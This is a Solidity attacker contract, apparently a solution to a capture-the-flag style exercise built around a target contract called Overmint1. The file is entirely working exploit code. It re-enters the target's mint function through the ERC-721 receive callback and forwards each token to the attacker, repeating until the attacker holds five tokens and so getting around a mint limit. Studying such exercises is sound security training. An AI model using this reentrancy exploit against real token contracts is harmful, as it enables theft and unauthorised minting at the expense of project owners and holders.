// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public overmint1;
    address public attacker;

    constructor(address _overmint1Address) {
        overmint1 = Overmint1(_overmint1Address);
        attacker = msg.sender;
    }

    function attack() external {
        require(msg.sender == attacker, "Not the attacker");
       overmint1.mint();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        overmint1.transferFrom(address(this), attacker, overmint1.totalSupply());
        if(overmint1.balanceOf(attacker) < 5) {
            overmint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
